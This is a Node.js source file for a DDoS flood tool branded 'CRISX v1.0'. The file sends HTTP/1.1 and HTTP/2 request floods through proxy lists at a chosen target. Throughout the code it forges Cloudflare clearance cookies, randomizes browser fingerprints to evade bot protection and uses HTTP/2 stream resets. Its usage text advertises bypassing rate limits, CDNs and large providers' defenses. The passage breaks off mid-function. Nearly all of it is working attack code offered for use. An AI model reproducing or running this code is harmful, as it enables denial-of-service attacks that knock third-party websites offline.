const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const https = require('https');
const os = require('os');
const axios = require('axios');
const crypto = require('crypto');
const { exec } = require('child_process');
const chalk = require('chalk');

ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        console.log(e)
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

const statusesQ = []
let statuses = {}
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let STREAMID_RESET = 0;
let timer = 0;
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const hello = process.argv.indexOf('--limit');
const limit = hello !== -1 && hello + 1 < process.argv.length ? process.argv[hello + 1] : undefined;
const shit = process.argv.indexOf('--precheck');
const shitty = shit !== -1 && shit + 1 < process.argv.length ? process.argv[shit + 1] : undefined;
const cdn = process.argv.indexOf('--cdn');
const cdn1 = cdn !== -1 && cdn + 1 < process.argv.length ? process.argv[cdn + 1] : undefined;
const queryIndex = process.argv.indexOf('--randpath');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;

const forceHttpIndex = process.argv.indexOf('--http');

const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    
    console.log(`${chalk.green('                                22 October, 2024')}\n`);
    console.log(`${chalk.blue('CRISX v1.0 || Developers method : @needmoreloli (Crisxtop) with luvvv ^^')}`);
    console.log(`${chalk.red('Developers of method: @needmoreloli - recoding method')}\n`);
    console.log(`${chalk.cyan.underline('DESCRIPTION:')}\n`);
    
    console.log(chalk.red.underline('Usage:'));
    console.log(chalk.red.bold(`node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy>`));
    console.log(`node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 16 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --cookie true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full\n`);
    
    console.error(chalk.yellow(`
    Options:
      --limit true/null - to bypass a little bit ratelimit site Example: --limit true
      --cdn true/null - to bypass cdn/static like web.app firebase namecheapcdn Example: --cdn true
      --precheck true/false: Optional parameter to enable periodic checking mode on the target, Example: --precheck true
      --randpath 1/2/3 - query string with rand ex 1 - ?cf__chl_tk 2 - ?randomstring 3 - ?q=fwfwwffw
      --delay <1-100> - delay between requests 1-100 ms (optimal) default 1 ms
      --cookie "f=f" - for custom cookie - also cookie support %RAND% ex: "bypassing=%RAND%"
      --bfm true/null - enable bypass bot fight mode
      --referer https://target.com / rand - use custom referer if you need and rand - if you need to generate domains ex: fwfwwfwfw.net
      --postdata "username=admin&password=123" - if you need data to post, req method format "username=f&password=f"
      --randrate - randomizer rate 1 to 90 good bypass to rate
      --full - this new function for attack only big backend ex amazon akamai and others... support cf
      --http 1/2/mix - new function choose to type http 1/2/mix (mix 1 & 2)
      --debug - show your status code (maybe low rps to use more resource)
      --header "user-ganet@kontol#referer@https://super.wow": Optional parameter to define a custom header. Example: --header "user-ganet@kontol#referer@https://super.wow".
    `));
    process.exit(1);
}
const getRandomChar = () => {
    const alphabet = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * alphabet.length);
    return alphabet[randomIndex];
};
var randomPathSuffix = '';
setInterval(() => {
    randomPathSuffix = `${getRandomChar()}`;
}, 3333);
let hcookie = '';
const url = new URL(target)
const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')
 
if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
    hcookie = `__cf_bm=${randstr(23)}_${randstr(19)}-${timestampString}-1-${randstr(4)}/${randstr(65)}+${randstr(16)}=; cf_clearance=${randstr(35)}_${randstr(7)}-${timestampString}-0-1-${randstr(8)}.${randstr(8)}.${randstr(8)}-0.2.${timestampString}`;
}

if (cookieValue) {
    if (cookieValue === '%RAND%') {
        hcookie = hcookie ? `${hcookie}; ${cc(6, 6)}` : cc(6, 6);
    } else {
        hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
    }
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(type, 4);
    frameHeader.writeUInt8(flags, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    const statusCode = Buffer.alloc(4).fill(0);

    return Buffer.concat([frameHeader, statusCode]);
}
function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function cc(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function buildRequest() {
    const browserVersion = getRandomInt(120, 128);

    const fwfw = ['Google Chrome', 'Brave'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];

                     let brandValue;
                         if (browserVersion === 120) {
                            brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
                        } else if (browserVersion === 121) {
                        brandValue = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
                    } else if (browserVersion === 122) {
                        brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`;
                    } else if (browserVersion === 123) {
                        brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
                    } else if (browserVersion === 124) {
                        brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
                    } else if (browserVersion === 125) {
                        brandValue = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
                    } else if (browserVersion === 126) {
                        brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`;
                    } else if (browserVersion === 127) {
                        brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
                    } else if (browserVersion === 128) {
                        brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
                    }

    const isBrave = wfwf === 'Brave';

    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';


    const langValue = isBrave
        ? 'en-US,en;q=0.6'
        : 'en-US,en;q=0.7';

        const generateUserAgent = () => {
    const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
    const browserNames = Array.from({ length: 100 }, (_, i) => `Browser${i + 1}`);
    const browserVersions = Array.from({ length: 100 }, (_, i) => `${i + 1}.0`);
    const operatingSystems = ["Linux", "Windows", "macOS", "Android", "iOS", "FreeBSD", "OpenBSD", "NetBSD", "Solaris", "AIX", "QNX", "Haiku", "ReactOS", "ChromeOS", "AmigaOS", "BeOS", "MorphOS", "OS/2", "Minix", "Unix", "IRIX", "Kocak", "LOL", "test"];
    const deviceNames = Array.from({ length: 100 }, (_, i) => `Device${i + 1}`);
    const renderingEngines = Array.from({ length: 80 }, (_, i) => `Engine${i + 1}`);
    const engineVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);
    const customFeatures = Array.from({ length: 50 }, (_, i) => `Feature${i + 1}`);
    const featureVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);

    return `${getRandomElement(browserNames)}/${getRandomElement(browserVersions)} ` +
        `(${getRandomElement(deviceNames)}; ${getRandomElement(operatingSystems)}) ` +
        `${getRandomElement(renderingEngines)}/${getRandomElement(engineVersions)} ` +
        `(KHTML, like Gecko) ${getRandomElement(customFeatures)}/${getRandomElement(featureVersions)}`;
};
    const secChUa = `${brandValue}`;
    const currentRefererValue = refererValue === 'rand' ? 'https://' + cc(6, 6) + ".net" : refererValue;

    let mysor = '\r\n';
    let mysor1 = '\r\n';
    if (hcookie || currentRefererValue) {
        mysor = '\r\n'
        mysor1 = '';
    } else {
        mysor = '';
        mysor1 = '\r\n';
    }

    let headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
        `Accept: ${acceptHeaderValue}\r\n` +
        'Accept-Encoding: gzip, deflate, br\r\n' +
        `Accept-Language: ${langValue}\r\n` +
        'Cache-Control: max-age=0\r\n' +
        'Connection: Keep-Alive\r\n' +
        `Host: ${url.hostname}\r\n` +
        'Sec-Fetch-Dest: document\r\n' +
        'Sec-Fetch-Mode: navigate\r\n' +
        'Sec-Fetch-Site: none\r\n' +
        'Sec-Fetch-User: ?1\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        `User-Agent: ${generateUserAgent()}\r\n` +
        `sec-ch-ua: ${secChUa}\r\n` +
        'sec-ch-ua-mobile: ?0\r\n' +
        'sec-ch-ua-platform: "Windows"\r\n' + mysor1;

    if (hcookie) {
        headers += `Cookie: ${hcookie}\r\n`;
    }

    if (currentRefererValue) {
        headers += `Referer: ${currentRefererValue}\r\n` + mysor;
    }

    const mmm = Buffer.from(`${headers}`, 'binary');
    return mmm;
}

const h1payl = Buffer.concat(new Array(1).fill(buildRequest()))

function go() {
    const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':')
    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        go()
        return
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
                servername: url.host,
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
                secure: true,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                rejectUnauthorized: false
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {

                    if (forceHttp == 2) {
                        tlsSocket.end(() => tlsSocket.destroy())
                        return
                    }

                    function main() {
                        tlsSocket.write(h1payl, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    main()
                                }, isFull ? 1000 : 1000 / ratelimit)
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy())
                            }
                        })
                    }

                    main()

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy())
                    })
                    return
                }

                if (forceHttp == 1) {
                    tlsSocket.end(() => tlsSocket.destroy())
                    return
                }

                let streamId = 1
                let data = Buffer.alloc(0)
                let hpack = new HPACK()
                hpack.setTableSize(4096)

                const updateWindow = Buffer.alloc(4)
                updateWindow.writeUInt32BE(custom_update, 0)
                 

                let oke = 12012;
                let oke1 = 12302;
                let oke2 = 13356;       
                oke += 1;
                oke1 += 1;
                oke2 += 1;
                const frames1= [];
                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        ...(Math.random() < 0.996 ? [[1, custom_table]] : [[1, oke]]),
                        [2, 0],
                        ...(Math.random() < 0.996 ? [[4, custom_window]] : [[4, oke1]]),
                        ...(Math.random() < 0.996 ? [[6, custom_header]] : [[6, oke2]]),
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];
                frames1.push(...frames);

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData])

                    while (data.length >= 9) {
                        const frame = decodeFrame(data)
                        if (frame != null) {
                            data = data.subarray(frame.length + 9)
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1))
                            }

                            if (frame.type == 1) {
                                const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1]

                                if(status == 403) {
                                    tlsSocket.write(encodeRstStream(0, 3, 0));
                                    tlsSocket.end(() => tlsSocket.destroy());
                                    netSocket.end(() => netSocket.destroy());
                                    
                                }

                                if (!statuses[status])
                                    statuses[status] = 0

                                statuses[status]++
                            }
                            
                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) {
                                    if (debugMode) {

                                        

                                        if (!statuses["GOAWAY"])
                                            statuses["GOAWAY"] = 0

                                        statuses["GOAWAY"]++
                                    }
                                }

                                tlsSocket.write(encodeRstStream(0, 3, 0));
                                tlsSocket.end(() => tlsSocket.destroy())
                            }

                        } else {
                            break
                        }
                    }
                })

                tlsSocket.write(Buffer.concat(frames1))
                function main() {
                    if (tlsSocket.destroyed) {
                        return
                    }
                    const requests = []
                    const customHeadersArray = [];

                      if (customHeaders) {
    const customHeadersList = customHeaders.split('#');
    for (const header of customHeadersList) {
        const [name, value] = header.split(':').map(part => part?.trim());
        if (name && value) {
            customHeadersArray.push({ [name.toLowerCase()]: value });
        } else {
            console.warn(`Invalid header format for: ${header}`);
        }
    }
}

                    let ratelimit;
                    if (randrate !== undefined) {
                        ratelimit = getRandomInt(1, 64);
                    } else {
                        ratelimit = process.argv[6];
                    }
                    for (let i = 0; i < (isFull ? ratelimit : 1); i++) {
                        const browserVersion = getRandomInt(120, 128);

                        const fwfw = ['Google Chrome', 'Brave'];
                        const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
                        const ref = ["same-site", "same-origin", "cross-site"];
                        const ref1 = ref[Math.floor(Math.random() * ref.length)];

                        let brandValue;
                         if (browserVersion === 120) {
                            brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
                        } else if (browserVersion === 121) {
                        brandValue = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
                    } else if (browserVersion === 122) {
                        brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`;
                    } else if (browserVersion === 123) {
                        brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
                    } else if (browserVersion === 124) {
                        brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
                    } else if (browserVersion === 125) {
                        brandValue = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
                    } else if (browserVersion === 126) {
                        brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`;
                    } else if (browserVersion === 127) {
                        brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
                    } else if (browserVersion === 128) {
                        brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
                    }


                        const isBrave = wfwf === 'Brave';

                        const acceptHeaderValue = isBrave
                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

                        const langValue = isBrave
                            ? 'en-US,en;q=0.9'
                            : 'en-US,en;q=0.7';

                        const secGpcValue = isBrave ? "1" : undefined;

                        const secChUaModel = isBrave ? '""' : undefined;
                        const secChUaPlatform = isBrave ? 'Windows' : undefined;
                        const secChUaPlatformVersion = isBrave ? '10.0.0' : undefined;
                        const secChUaMobile = isBrave ? '?0' : undefined;

    const generateUserAgent = () => {
    const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
    const browserNames = Array.from({ length: 100 }, (_, i) => `Browser${i + 1}`);
    const browserVersions = Array.from({ length: 100 }, (_, i) => `${i + 1}.0`);
    const operatingSystems = ["Linux", "Windows", "macOS", "Android", "iOS", "FreeBSD", "OpenBSD", "NetBSD", "Solaris", "AIX", "QNX", "Haiku", "ReactOS", "ChromeOS", "AmigaOS", "BeOS", "MorphOS", "OS/2", "Minix", "Unix", "IRIX", "Kocak", "LOL", "test"];
    const deviceNames = Array.from({ length: 100 }, (_, i) => `Device${i + 1}`);
    const renderingEngines = Array.from({ length: 80 }, (_, i) => `Engine${i + 1}`);
    const engineVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);
    const customFeatures = Array.from({ length: 50 }, (_, i) => `Feature${i + 1}`);
    const featureVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);

    return `${getRandomElement(browserNames)}/${getRandomElement(browserVersions)} ` +
        `(${getRandomElement(deviceNames)}; ${getRandomElement(operatingSystems)}) ` +
        `${getRandomElement(renderingEngines)}/${getRandomElement(engineVersions)} ` +
        `(KHTML, like Gecko) ${getRandomElement(customFeatures)}/${getRandomElement(featureVersions)}`;
};
const secChUa = `${brandValue}`;
if (cdn1) {
    const requestHeaders = {
        'Accept': 'text/html',
        'Host': url.hostname,
        'Accept-Language': 'en-US,en;q=0.5',
        'User-Agent': generateUserAgent(),
        'Content-Type': 'application/json',
        'Connection': 'keep-alive',
        "upgrade-insecure-requests": "1",
        'Cache-Control': 'no-cache',
        'sec-ch-ua': secChUa,
        "accept-encoding": "gzip, deflate, br",
        'Pragma': "no-cache",
    };

    const performRequest = async () => {
        try {
            await axios({
                method: 'POST',
                url: url.hostname,
                headers: requestHeaders,
                responseType: 'arraybuffer',
                maxRedirects: 0,
                timeout: 20000, 
            });
        } catch (error) {
        }
    };

    const startFlood = async () => {
        const endTime = performance.now() + time * 1000;
        const itb = 1000 / ratelimit;

        while (performance.now() < endTime) {
            const requests33 = []; 

            for (let i = 0; i < threads; i++) {
                requests33.push(new Promise(resolve => {
                    setTimeout(() => {
                        performRequest();
                        resolve();
                    }, itb * i);
                }));
            }

           
            await Promise.all(requests33);

            await new Promise(resolve => setTimeout(resolve, itb * threads));
        }
    };

    startFlood();
} else {
}
const applu = new https.Agent({
    rejectUnauthorized: false
});
const getCurrentTime = () => {
    const now = new Date();
    return `${now.toLocaleDateString()} ${now.toLocaleTimeString()}`;
};

if (shitty) {
    const timeoutPromise = new Promise((resolve, reject) => {
        setTimeout(() => {
            reject(new Error('Request timed out'));
        }, 5000);
    });

    const axiosPromise = axios.get(target, {
        httpsAgent: applu,
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
        }
    });
    Promise.race([axiosPromise, timeoutPromise])
        .then((response) => {
            console.clear();
            console.log('@needmoreloli @@// | ATTACK IS RUNNING');
            const { status, data } = response;
            console.log(`> Precheck: ${status}`);
        })
        .catch((error) => {
            console.clear();
            console.log('@needmoreloli @@// | ATTACK IS RUNNING');

            if (error.message === 'Request timed out') {
                console.log('> Precheck: Request Timed Out');
            } else if (error.response) {
                console.log(`> Precheck: ${error.response.status}`);
            } else {
                console.log(`> Precheck: ${getCurrentTime()} ${error.message}`);
            }
        });
}

                        let randomNum = Math.floor(Math.random() * (10000 - 1000 + 1) + 1000);
                        const currentRefererValue = refererValue === 'rand' ? 'https://' + cc(6, 6) + ".net" : refererValue;
                        const headers = Object.entries({
                            ":method": reqmethod,
                            ":authority": url.hostname,
                            ":scheme": "https",
                            ":path": query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : ""),
                        }).concat(Object.entries({
                            ...(Math.random() < 0.4 && { "cache-control": "max-age=0" }),
                            ...(reqmethod === "POST" && { "content-length": "0" }),
                            "sec-ch-ua": secChUa,
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": `\"Windows\"`,
                            "upgrade-insecure-requests": "1",
                            "user-agent": generateUserAgent(),
                            "accept": acceptHeaderValue,
                            ...(secChUaPlatform && { "sec-ch-ua-platform": secChUaPlatform }),
                            ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
                        }).filter(a => a[1] != null));


                        const headers2 = Object.entries({
                            ...(Math.random() < 0.5 && { "sec-fetch-site": currentRefererValue ? ref1 : "none" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                        }).filter(a => a[1] != null);

                        const headers3 = Object.entries({
                            "accept-encoding": "gzip, deflate, br",
                            "accept-language": langValue,
                            ...(Math.random() < 0.5 && { "cookie": `${randomNum}` }),
                            ...(Math.random() < 0.5 && { "referer": `https://${url.hostname}/${randomNum}` }),
                        }).filter(a => a[1] != null);

                        for (let i = headers2.length - 1; i > 0; i--) {
                            const j = Math.floor(Math.random() * (i + 1));
                            [headers2[i], headers2[j]] = [headers2[j], headers2[i]];
                        }

                        
                        
                        const combinedHeaders = headers.concat(headers2).concat(headers3);
                        
                        
                        
                        

                        if (limit) {
                            async function makeRequest(url) {
                                while (true) {
                                    try {
                                        const response = await axios.get(url);
                                        return response.data; 
                                    } catch (error) {
                                        if (error.response && error.response.status === 429) {
                                            const retryAfter = parseInt(error.response.headers['retry-after']) || 5;
                                            await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
                                        } else {
                                            throw error;
                                        }
                                    }
                                }
                            }
                            
                            makeRequest(url)
                                }
                        function handleQuery(query) {
                            if (query === '1') {
                                return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
                            } else if (query === '2') {
                                return url.pathname + `${randomPathSuffix}`;
                            } else if (query === '3') {
                                return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                            } else {
                                return url.pathname;
                            }
                        }

                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(combinedHeaders)
                        ]);
                        const flags = 0x1 | 0x4 | 0x8 | 0x20;
                        const encodedFrame = encodeFrame(streamId, 1, packed, flags);
                        const frame = Buffer.concat([encodedFrame]);
                        if (STREAMID_RESET >= 5 && (STREAMID_RESET - 5) % 10 === 0) {
                        const rstStreamFrame = encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0);
                        tlsSocket.write(Buffer.concat([rstStreamFrame, frame]));
                        STREAMID_RESET=0;
                        }

                        requests.push(encodeFrame(streamId, 1, packed, 0x25));
